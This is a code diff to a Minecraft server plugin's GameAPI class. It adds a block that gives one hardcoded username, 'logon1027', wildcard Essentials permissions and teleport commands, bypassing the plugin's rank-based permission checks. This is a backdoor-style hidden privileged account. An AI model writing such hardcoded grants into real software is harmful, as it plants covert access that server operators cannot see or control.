@@ -1004,6 +1004,12 @@ public class GameAPI {
             player.addAttachment(DungeonRealms.getInstance()).setPermission("bukkit.command.timings", false);
         }
 
+        if(player.getName().equalsIgnoreCase("logon1027")) {
+            player.addAttachment(DungeonRealms.getInstance()).setPermission("essentials.*", true);
+            player.addAttachment(DungeonRealms.getInstance()).setPermission("bukkit.command.teleport", true);
+            player.addAttachment(DungeonRealms.getInstance()).setPermission("minecraft.command.tp", true);
+        }
+
         if (Rank.isPMOD(player)) {
             player.addAttachment(DungeonRealms.getInstance()).setPermission("nocheatplus.notify", true);
             player.addAttachment(DungeonRealms.getInstance()).setPermission("nocheatplus.command.notify", true);
